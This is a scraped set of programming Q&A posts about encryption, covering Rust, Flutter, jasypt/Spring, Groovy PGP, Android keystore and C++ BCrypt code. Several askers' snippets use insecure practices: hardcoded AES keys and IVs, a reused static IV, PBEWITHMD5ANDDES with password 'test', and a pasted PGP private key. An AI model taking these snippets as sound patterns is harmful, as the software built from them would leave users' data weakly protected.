        input_file.write_all(&amp;decrypted_chunk)?;

        // Move the offset to the next chunk
        offset += bytes_read as u64;
    }

    println!(&quot;Decryption completed successfully.&quot;);
    Ok(())
}
</code></pre>
<p>I expected it to work for files larger than the chunk buffer size but turns out my implementation of chunking data is bad.</p>
"
"<p>How do i encrypt a database in flutter and use it on ios?</p>
<p>Initial efforts were with hive with the key flutter_secure_storage. This works fine on Android, but on iOS we seem to run into problems with IOS accessibility. the default is particularly bad, and &quot;always&quot; is not available through the plugin and has been marked deprecated and/or &quot;not recommended&quot; ; see <a href=""https://developer.apple.com/documentation/security/keychain_services/keychain_items/restricting_keychain_item_accessibility"" rel=""nofollow noreferrer"">https://developer.apple.com/documentation/security/keychain_services/keychain_items/restricting_keychain_item_accessibility</a></p>
<p>and: <a href=""https://pub.dev/packages/flutter_secure_storage"" rel=""nofollow noreferrer"">https://pub.dev/packages/flutter_secure_storage</a></p>
<p>If db is protected bc device is locked then it  appears to return contains=false, read=null the same as if it were never written, so then making a new key and using   it can corrupt/delete the entire db</p>
<p>Some ideas</p>
<ol>
<li><p>check app resumed to see if background access</p>
</li>
<li><p>wirte and read a dummy value and see if it is the same</p>
</li>
<li><p>save into sharedprefs initializedHive true/false or similar</p>
</li>
<li><p>check cupertinoIsProtected, but that seems to require code in develop not released to pub.dev for flutter_secure_storage</p>
</li>
</ol>
<p>Tried readAll , read, contains, was hoping for an exception rather than null/empty from flutter_secure_storage
see: <a href=""https://github.com/neiljaywarner/flutter_background_geolocation/commit/0a55e883e68edab3cec0cfd18bec22466b6cf0b3#diff-86917493a1c5b1988760f51b20bbac6281d105e6d0699e1d97b1ee1cb30db4b4"" rel=""nofollow noreferrer"">https://github.com/neiljaywarner/flutter_background_geolocation/commit/0a55e883e68edab3cec0cfd18bec22466b6cf0b3#diff-86917493a1c5b1988760f51b20bbac6281d105e6d0699e1d97b1ee1cb30db4b4</a></p>
"
"<p>When I try to encrypt DB connect information, I'm at a loss as to what to do if the information is in XML rather than properties.</p>
<p>I'm using Spring 4.x.x, eclipse, java 1.8, jasypt spring-31(1.9.2)</p>
<p>To explain the context.xml and the config.xml containing db information with the just bean settings,</p>
<ul>
<li>The config.xml has the following structure.</li>
<li>I put in the contact ID, PW to encrypt by CMD (jasypt-1.9.3-dist)</li>
</ul>
<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;   
&lt;config&gt;        
    &lt;jdbc&gt;      
        &lt;driverName&gt;DBMS Driver&lt;/driverName&gt;        
        &lt;url&gt;URL value&lt;/url&gt;        
        &lt;id&gt;access ID&lt;/id&gt;      
        &lt;pw&gt;access PW&lt;/pw&gt;  
    &lt;/jdbc&gt; 
&lt;/config&gt; 
</code></pre>
<ul>
<li>context.xml has the following structure.</li>
</ul>
<p>If I set it as below and start the server, the config will get an error saying that DOCTYPE should be equal to null.
(The above-mentioned config is identified as a property config of an empty id = configuration Encryptor.)</p>
<p>When using jasypt, it said that it is processed without having to set up a separate DOCTYPE.</p>
<p>I also tried to set it to the DOCTYPE system..., specify the dtd file, and add it to the metadata folder, but it was also not processed.</p>
<p>Therefore, in order to process DB information separately as properties, the placeholder created a location property and designated the path, but this also failed to put variable values in the dataSourceSpied bean normally.</p>
<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
// beans xmlns, xsi
// mybatis bean

&lt;!-- placeholder --&gt;
&lt;bean class=&quot;org.springframework.beans.factory.config.PropertyPlaceholderConfigurer&quot;&gt;
        &lt;property name=&quot;properties&quot;&gt;
            &lt;bean class=&quot;org.springmodules.commons.configuration.CommonsConfigurationFactoryBean&quot;&gt;
                &lt;property name=&quot;configurations&quot;&gt;
                    &lt;list&gt;
                        &lt;ref bean=&quot;configuration&quot; /&gt;
                    &lt;/list&gt;
                &lt;/property&gt;
            &lt;/bean&gt;
        &lt;/property&gt;
&lt;/bean&gt;

&lt;bean id=&quot;configuration&quot; class=&quot;org.apache.commons.configuration.CompositeConfiguration&quot;&gt;
    &lt;constructor-arg&gt;
        &lt;list&gt;
            &lt;bean class=&quot;org.apache.commons.configuration.XMLConfiguration&quot;&gt;
                &lt;constructor-arg type=&quot;java.lang.String&quot;&gt;
                    &lt;value&gt;config/config.xml&lt;/value&gt;
                &lt;/constructor-arg&gt;
            &lt;/bean&gt;
        &lt;/list&gt;
    &lt;/constructor-arg&gt;
&lt;/bean&gt;

&lt;!-- DB connect --&gt;
&lt;bean id=&quot;dataSourceSpied&quot; class=&quot;org.apache.commons.dbcp.BasicDataSource&quot; destroy-method=&quot;close&quot;&gt;
        &lt;property name=&quot;driverClassName&quot; value=&quot;${jdbc.driverName}&quot;/&gt;
        &lt;property name=&quot;url&quot; value=&quot;${jdbc.url}&quot;/&gt;
        &lt;property name=&quot;username&quot; value=&quot;${jdbc.id}&quot;/&gt;
        &lt;property name=&quot;password&quot; value=&quot;${jdbc.pw}&quot;/&gt;
&lt;/bean&gt;

&lt;!-- jasypt --&gt;
&lt;bean id=&quot;environmentVariablesConfiguration&quot; class=&quot;org.jasypt.encryption.pbe.config.EnvironmentStringPBEConfig&quot;&gt;
        &lt;property name=&quot;algorithm&quot; value=&quot;PBEWITHMD5ANDDES&quot;/&gt;
        &lt;property name=&quot;password&quot; value=&quot;test&quot;/&gt;
&lt;/bean&gt;

&lt;bean id=&quot;configurationEncryptor&quot; class=&quot;org.jasypt.encryption.pbe.StandardPBEStringEncryptor&quot;&gt;
        &lt;property name=&quot;config&quot; ref=&quot;environmentVariablesConfiguration&quot;/&gt;
&lt;/bean&gt;    

&lt;bean class=&quot;org.jasypt.spring31.properties.EncryptablePropertyPlaceholderConfigurer&quot;&gt;
    &lt;constructor-arg ref=&quot;configurationEncryptor&quot; /&gt;
    &lt;property name=&quot;locations&quot; value=&quot;classpath:/config/config.xml&quot; /&gt;
&lt;/bean&gt;
</code></pre>
<p>How do I solve this problem?</p>
<p>please let me know anything your opinion.</p>
<p>I tried same encrypt in srping-boot.
It clearly started.
But I can not solve this same thing in xml.</p>
"
"<p>I want to add auto sign in functions to my app. Also it should include encrypt/decrypt function.</p>
<p>My code is below:</p>
<p>this is where I get the parameters and encrypt them. I updated it as below</p>
<pre><code>

import 'package:encrypt/encrypt.dart';

class EncryptData {
static Encrypted? encrypted;
static var decrypted;
static final iv = IV.fromLength(16);


static encryptAES(String plainText, String userKey) {
print(plainText);
final key = Key.fromUtf8(userKey);
// final iv = IV.fromLength(16);
final encrypter = Encrypter(AES(key));
encrypted = encrypter.encrypt(plainText, iv: iv);
print(encrypted!.base64);
return encrypted;
 }

 static decryptAES(String encrypted, String userKey, String ivBase64) {
 final key = Key.fromUtf8(userKey);
 final iv = IV.fromBase64(ivBase64); //creating iv from the ivBase64 string
final encrypter = Encrypter(AES(key));
decrypted = encrypter.decrypt64(encrypted, iv: iv);
return decrypted.toString();
 }
}
</code></pre>
<p>I tried to add iv in storage:</p>
<pre><code> final storage =  FlutterSecureStorage();
                    SharedPreferences pref = await SharedPreferences.getInstance();
                     final userId = _auth.currentUser!.uid;
                     final newDateString = &quot;1kr95ye3mcfgjt124p-54&quot;;  
                    String subUserId = userId.substring(0, 11);  
                    String key = subUserId + newDateString;
                    final String ivToBase64 = EncryptData.iv.base64 //store this in local storage
                    final String ivFromBase64 = IV.fromBase64(ivToBase64).base64;
                    var encryptMail;
                    var encryotPassword;
                    var encryptMailD;
                    var encryotPasswordD;
                    print(&quot;ANAHTAR: &quot;+ key);
                    encryptMail = EncryptData.encryptAES(email.toString(), key);
                    encryotPassword = EncryptData.encryptAES(sifre.toString(), key); 
                    encryptMailD = EncryptData.decryptAES(encryptMail.base64, key,ivFromBase64);
                    encryotPasswordD = EncryptData.decryptAES(encryotPassword.base64, key,ivFromBase64);
                    print(&quot;DENEME : &quot; + email);
                    print(&quot;DENEME : &quot; + sifre);
                    print(&quot;DENEME2 : &quot; + encryptMail.base64);
                    print(&quot;DENEME2 : &quot; + encryotPassword.base64);
                    print(&quot;DENEME3 : &quot; + encryptMailD.toString());
                    print(&quot;DENEME3 : &quot; + encryotPasswordD.toString());
                    await storage.write(key: 'mail2', value: encryptMail!.base64);
                    await storage.write(key: 'password2', value: encryotPassword!.base64);
                    await storage.write(key: 'loginState2', value: true.toString());
                    await storage.write(key: &quot;ilkOturum&quot;, value: &quot;false&quot;);
                    await storage.write(key: &quot;iv2&quot;, value: ivToBase64);
                    pref.setString('mail', encryptMail.base64);
                    pref.setString('password', encryotPassword.base64);
                    pref.setString('iv', ivToBase64);
                    pref.setBool('loginState', true);
                    print(&quot;bilgiler kayıt edildi&quot;);
</code></pre>
<p>and then decrypt :</p>
<pre><code>var mail = await storage.read(key: 'mail2');
var password = await storage.read(key: 'password2');
var iv = await storage.read(key: 'iv2');

          if (mail != null &amp;&amp; password != null) {
  var encryptMailD = EncryptData.decryptAES(mail, key, iv.toString());
  var encryotPasswordD = EncryptData.decryptAES(password, key, iv.toString());
</code></pre>
<p>Now it is working! Thanks for your help</p>
"
"<p>I am trying to encrypt a message in PGP, but the encryption is not working properly. The encryption message I am getting is not being decrypted. On using a platform online to  decrypt and encrypt using same set of keys- its working good. But when I am trying to encrypt it using my logic- it's not working.</p>
<p>I have added public/private keys that I generated for the test.</p>
<p>I feel the output of the message encryption code using PGP is wrong.This is the error I am facing when I am trying to decrypt the PGP message that I fetched as output from the below code -</p>
<blockquote>
<p>org.bouncycastle.openpgp.PGPRuntimeOperationException: Iterator failed to get next object: unknown object in stream: 20 Caused by: java.io.IOException: unknown object in stream:</p>
</blockquote>
<p>This is the groovy code-</p>
<pre class=""lang-java prettyprint-override""><code>@Grab(group='org.bouncycastle', module='bcpkix-jdk15on', version='1.70')
@Grab(group='org.bouncycastle', module='bcpg-jdk15on', version='1.70')
@Grab(group='org.bouncycastle', module='bcprov-jdk15on', version='1.70')

import java.io.ByteArrayInputStream
import java.io.ByteArrayOutputStream
import java.io.InputStream
import java.io.OutputStream
import java.io.IOException
import java.security.SecureRandom
import java.util.Iterator
import org.bouncycastle.openpgp.*
import org.bouncycastle.openpgp.operator.jcajce.JcePublicKeyKeyEncryptionMethodGenerator
import org.bouncycastle.openpgp.operator.jcajce.JcePGPDataEncryptorBuilder
import org.bouncycastle.openpgp.operator.jcajce.JcaKeyFingerprintCalculator
import org.bouncycastle.util.Iterable
import org.bouncycastle.bcpg.ArmoredOutputStream


String message = &quot;This is a secret message.&quot;
byte[] messageBytes = message.getBytes(&quot;UTF-8&quot;)
byte[] encryptedMessage


PGPPublicKey publicKey = readPublicKey(&quot;&quot;&quot;-----BEGIN PGP PUBLIC KEY BLOCK-----
Version: Keybase OpenPGP v1.0.0
Comment: https://keybase.io/crypto

xo0EZd8jJgEEAMUFpO19INzZGSl/RWfqFMvDOBSBV3AFIGdBzUCGCDgOP2A784eg
dSemCezryl8Ik32oJp+a+yWoZmv+jT8J1rSgBPBX1rsA5OdmqEIQ4fZar8tTw/gN
PozNwAFIS+VuYwLRkY7wTkBDj+a2yh6XBH6SkT5AvOhIEEEFMhsBElJFABEBAAHN
D2thcmFuIDxrQHMuY29tPsKtBBMBCgAXBQJl3yMmAhsvAwsJBwMVCggCHgECF4AA
CgkQibbxXQCyUgmQuAQAsU2b5vT8xXC3cKG+6whSjYgdH8pJ4yXOQ69olIH7+gA+
HdqVmWh+b4eTBxQlv/HQ/w3tPhjmfC/YTJKKuqThOcvXTEd97lwzcrI6nm0QuX/q
P5IwNO7vEzjmUc2jgSoj1eQHkTYJ5u3Vu4XjRpbxj84wVU3Br4fxuZg/NCs9EXnO
jQRl3yMmAQQAsRq/6Yp+1+3x0z6b+CDxx8QVN2KoKIWCY611SJRuPX7MTuOUjtZ7
2/pvID1lohJVUMTerskdVOvZo6zTzEymD4uMbqd4IPGzir4+yHDKefz7FTjCtKen
WRXKu7vDWsLXjgbigU+0lWQ7lacUR4tQ3DH3ysf2O5jfHXADkiJS5U8AEQEAAcLA
gwQYAQoADwUCZd8jJgUJDwmcAAIbLgCoCRCJtvFdALJSCZ0gBBkBCgAGBQJl3yMm
AAoJEBftRsxoEmYlp2sD/3JRZeMONe4rEsJyfRSlQkPLLv+nAS/q+s1ZB2m0iyhq
0uJl9mMI1nJ5bWLq2rlCgpNpx12pW1vqE0RyOzBEwlfvugNRGxyezF2tjgesaLvz
JE/Wt82tmT0lKf+DI5KKfYlACdOB5qXkxageXsyy95tl/2g0GHkzl2phFBIn/n3T
98YEAJ6H6ldp7PBgpI/NB8CcDA+1UQGfYul9xi4qV42ThOeWD1yPXtokKPjc/QZh
FPiZ6uPoch85oHJY0r9OJnJXIqJWJvIvCJQ+d1JgivCMHcE23Yd1QCl7F4dXTm8Y
DjspdGbNkwBoKEHrQkdH1CMJI5gs1hO98Zqs5iEFS+YTYwwzzo0EZd8jJgEEAOUy
1hRwz/5XpLJtxoAAq6lJtsNh4gfQ2SHU7bODtuNTt6Q1vcPgmv5lNNewhW4dUZza
806VJkoSjaY8tgkHO0rF1AsPOMP3VSrEyHcIlL/aMz/5yUxr5iqACou7jv4rJfnJ
hF/mAynEQ1D/DVYcqxYTo1J22qySoSYmwZ6s5toDABEBAAHCwIMEGAEKAA8FAmXf
IyYFCQ8JnAACGy4AqAkQibbxXQCyUgmdIAQZAQoABgUCZd8jJgAKCRCqiMN3fbsk
N5ArA/43YpAsO9Gjz+s+Ew33zusv+j59jSiGSNuATfTnQ61tYtTqdEDrC9p05fj+
+VePh7Nb28Eze9MBxEwbIPyVrM8N1CsPSVp0Xw5iymiFBMa8DbGZQS5NUHQJnci9
2uzJygdGB2RzrAl29A45wd09AHGfmriluYw9aKyQe5hEDMBeT60ABACsvp17ZnAq
NGAQqxxE0xFbflhGlvHiR2CVqRb57hcIybkWxrhHBY67PTgCvNQIzX6+05nBZ7fg
+PX5twSnejx4TBOlgegJnHQCdSXnBGy2DChceeXrFIhgR2KDXtkDwd7zQBWEplKP
l6zVJWLRjNCwhMZYSxCPgw8E5VXgESs89g==
=b1tp
-----END PGP PUBLIC KEY BLOCK-----&quot;&quot;&quot;)


PGPEncryptedDataGenerator encryptedDataGenerator = new PGPEncryptedDataGenerator(
                new JcePGPDataEncryptorBuilder(PGPEncryptedData.AES_256)
                        .setWithIntegrityPacket(true)
                        .setSecureRandom(new SecureRandom())
)

encryptedDataGenerator.addMethod(
        new JcePublicKeyKeyEncryptionMethodGenerator(publicKey)
                .setSecureRandom(new SecureRandom()))

ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
ArmoredOutputStream aOut = new ArmoredOutputStream(byteArrayOutputStream);
OutputStream cOut = encryptedDataGenerator.open(aOut, messageBytes.length);
cOut.write(messageBytes);
cOut.close();
aOut.close();
System.out.println(byteArrayOutputStream.toString());




private PGPPublicKey readPublicKey(String publicKeyString) throws IOException, PGPException {
    InputStream inputStream = PGPUtil.getDecoderStream(new ByteArrayInputStream(publicKeyString.getBytes(&quot;UTF-8&quot;)))
    PGPPublicKeyRingCollection pgpPublicKeyRingCollection = new PGPPublicKeyRingCollection(inputStream, new JcaKeyFingerprintCalculator())

    Iterator publicKeyRingIter = pgpPublicKeyRingCollection.getKeyRings()

    while (publicKeyRingIter.hasNext()) {
        PGPPublicKeyRing publicKeyRing = (PGPPublicKeyRing) publicKeyRingIter.next()
        Iterator&lt;PGPPublicKey&gt; publicKeyIter = publicKeyRing.getPublicKeys()

        while (publicKeyIter.hasNext()) {
            PGPPublicKey key = publicKeyIter.next()
            if (key.isEncryptionKey()) {
                return key
            }
        }
    }
    throw new IllegalArgumentException(&quot;Can't find encryption key in key ring.&quot;)
}
</code></pre>
<p>This is the private key-</p>
<pre class=""lang-none prettyprint-override""><code>-----BEGIN PGP PRIVATE KEY BLOCK-----
Version: Keybase OpenPGP v1.0.0
Comment: https://keybase.io/crypto

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
5VXgESs89g==
=gEXS
-----END PGP PRIVATE KEY BLOCK-----
</code></pre>
<p>The output is -</p>
<pre><code>-----BEGIN PGP MESSAGE-----
Version: BCPG v1.70

hIwDibbxXQCyUgkBA/9ErJnw641vPYrGFWFCexLVUx7S7BelxO1wB0ujjp6hJctA
GNmy9xJjOoFyT4HhBrJo5CrKkL5nkYxsuYQFpeMzWKQbWgMa7PjWVmRXc5LwgqlK
BsmoOppIO2LyNGT+N+7plnPwe/HzDfxMrcwYJWayD+ARpGRbjel0xO7WeHIMVNJC
AeQ1wXeTjaF0rooxZtfFIcymcEbuXbPaAbG2o7n+4DG1mIovQ89scSrVYjo0XAMz
5JA9qZOfXj3fa1itRmNfrZEk
=prY8
-----END PGP MESSAGE-----
</code></pre>
<p>But I am unable to decrypt this. What am I doing wrong while encrypting?</p>
"
"<p>I am trying to load a json (newline delimited) file stored on a private GCS bucket using <a href=""https://ibis-project.org/"" rel=""nofollow noreferrer"">ibis</a>. I get the following error:</p>
<p><code>Invalid Input Error: Malformed JSON in file &quot;&lt;&lt;&lt;URL&gt;&gt;&gt;&quot;, at byte 1 in record/value 2: unexpected character. </code></p>
<p>However, after setting the file access to public I have no issues loading the data.</p>
<p>Makes me think GCS applies some kind of compression/encryption to private GCS files.</p>
<p>**Any idea how to get this issue solved is much appreciated!
**
Note that:
The url for private files starts with <code>https://storage.cloud.google.com</code>
The url for public files starts with <code>https://storage.googleapis.com</code></p>
<p>Tried uploading the file with different file formats (.txt, .jsonl, .json) but no effect.</p>
<p>Also tried mingling the file type (application/json, text/plain) etc. No effect either.</p>
<p>The one thing I found to have effect is the access setting...</p>
"
"<p>I want to convert an private key to an String so that user can store it in hard state .</p>
<p>i tried to convert the private key  using Base64 but it gives me error stating privateKey.getEncoded() is null</p>
<p>So i tried before Base64 and again i got null .</p>
<pre><code>public String newKey() throws
            NoSuchAlgorithmException,
            NoSuchProviderException,
            InvalidAlgorithmParameterException, KeyStoreException, CertificateEncodingException, UnrecoverableEntryException {

        KeyPairGenerator keyPairGenerator = KeyPairGenerator.getInstance(ALGORITHM, KEYSTORE);
        KeyGenParameterSpec keyGenParameterSpec = new KeyGenParameterSpec
                .Builder(alias, KeyProperties.PURPOSE_ENCRYPT | KeyProperties.PURPOSE_DECRYPT)
                .setBlockModes(KeyProperties.BLOCK_MODE_ECB)
                .setEncryptionPaddings(PADDING)
                .build();

        keyPairGenerator.initialize(keyGenParameterSpec);
        PrivateKey key = keyPairGenerator.generateKeyPair().getPrivate();

        KeyStore.PrivateKeyEntry entry = (KeyStore.PrivateKeyEntry) keyStore.getEntry(alias,null);
        String a = privateKeyEntryToString(entry,key);
        //  java.util.Base64.getDecoder().decode(entry)
        //  Log.d(&quot;tag&quot;,entry);


        Log.d(&quot;tag&quot;, &quot;done in new Key returning keypublic&quot;);
        return a;
       // return keyPairGenerator.generateKeyPair().getPublic();

    }
</code></pre>
<pre><code>    private String privateKeyEntryToString(KeyStore.PrivateKeyEntry privateKeyEntry,PrivateKey key) throws CertificateEncodingException {

 Certificate certificate = privateKeyEntry.getCertificate();
        if (key.getEncoded().length == 0){ // but here we get exception that it is null.
            return &quot;its empty&quot;;
        }
        
        

        // Convert PrivateKey and Certificate to String
        String privateKeyString = Base64.encodeToString(key.getEncoded(), Base64.DEFAULT);
        String certificateString = Base64.encodeToString(certificate.getEncoded(), Base64.DEFAULT);

        // Combine both strings with a separator for later use
        return privateKeyString + &quot;-----BEGIN CERTIFICATE-----\n&quot; + certificateString;
</code></pre>
<p>Stack trace :</p>
<pre><code>FATAL EXCEPTION: main
Process: com.leo.nopasswordforyou, PID: 9525
java.lang.NullPointerException: Attempt to get length of null array
</code></pre>
"
"<p>Have a JDK7 app invoking an AWS lambda, currently configured via a lambda function URL. Looks like we have an incompatible cpiher set, is it possible to override the SSL Certificate or the ciphers used with a function URL?</p>
<p>If not, is this possible using API Gateway?</p>
"
"<p>I have written a code to encrypt according to AES 256 algorithm and it works to give me an output file but I realised that it hangs after running the EncryptDecryptString function and does not perform anything else after that. Why is this so? How can I further improve this code to perform encryption and decryption?</p>
<pre><code>#include &lt;windows.h&gt;
#include &lt;stdio.h&gt;
#include &lt;bcrypt.h&gt;
#include &lt;iostream&gt;
#include &lt;fstream&gt;
#include &lt;string&gt;

#pragma comment(lib, &quot;bcrypt.lib&quot;)

#define NT_SUCCESS(Status)          (((NTSTATUS)(Status)) &gt;= 0)
#define STATUS_UNSUCCESSFUL         ((NTSTATUS)0xC0000001L)

// Function to decrypt using AES256 algorithm
void ENcryptDecryptString(const std::string&amp; inputString, const std::string&amp; outputFile, bool encrypt){
    // Constants for encryption
    #define KEY_SIZE 32
    #define IV_SIZE 16
    
    const unsigned char ENCRYPTION_KEY[KEY_SIZE] = {
        0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
        0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0xoF,
        0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17,
        0x18, 0x19, 0x1A, 0x1B, 0x1C, 0x1D, 0x1E, 0x1F
    };
    
    const unsigned char IV[IV_SIZE] = {
        0x20, 0x21, 0x22, 0x23, 0x24, 0x25, 0x26, 0x27,
        0x28, 0x29, 0x2A, 0x2B, 0x2C, 0x2D, 0x2E, 0x2F
    };
    
    BCRYPT_ALG_HANDLE hAesAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    NTSTATUS status = STATUS_UNSUCCESSFUL;
    DWORD cbCipherText = 0, cbPlainText = 0, cbData = 0, cbKeyObject = 0, cbBlockLen = 0, cbBlob = 0;
    PBYTE pbCipherText = NULL, pbPlainText = NULL, pbKeyObject = NULL, pbIV = NULL, pbBlob = NULL;
    
    // Open an algorithm handle
    if (!NT_SUCCESS(status = BCryptOpenAlgorithmProvider(&amp;hAesAlg, BCRYPT_AES_ALGORITHM, NULL, 0))){
        wprintf(L&quot;**** Error 0x%x returned by BCryptOpenAlgorithmProvider\n&quot;, status);
        goto Cleanup;
    }
    
    // Calculate the size of the buffer to hold the KeyObject
    if (!NT_SUCCESS(status = BCryptGetProperty(hAesAlg, BCRYPT_OBJECT_LENGTH, (PBYTE)&amp;cbKeyObject, sizeof(DWORD), &amp;cbData, 0))){
        wprintf(L&quot;**** Error 0x%x returned by BCryptGetProperty\n&quot;, status);
        goto Cleanup;
    }
    
    // Allocate the key object on the heap
    pbKeyObject = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbKeyObject);
    if (pbKeyObject == NULL){
        wprintf(L&quot;**** memory allocation failed\n&quot;);
        goto Cleanup;
    }
    
    // Calculate the block length for the IV
    if (!NT_SUCCESS(status = BCryptGetProperty(hAesAlg, BCRYPT_BLOCK_LENGTH, (PBYTE)&amp;cbBlockLen, sizeof(DWORD), &amp;cbData, 0))){
        wprintf(L&quot;**** Error 0x%x returned by BCryptGetProperty_IV\n&quot;, status);
        goto Cleanup;
    }
    
    // Allocate a buffer for the IV
    pbIV = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbBlockLen);
    if (pbIV == NULL){
        wprintf(L&quot;**** IV memory allocation failed\n&quot;);
        goto Cleanup;
    }
    
    // Use the provided IV
    memcpy(pbIV, IV, IV_SIZE);
    
    // Set the chaining mode to CBC
    if (!NT_SUCCESS(status = BCryptSetProperty(hAesAlg, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0))){
        wprintf(L&quot;**** Error 0x%x returned by BCryptGetProperty_chaining_mode\n&quot;, status);
        goto Cleanup;
    }
    
    // Generate the key from supplied input key bytes
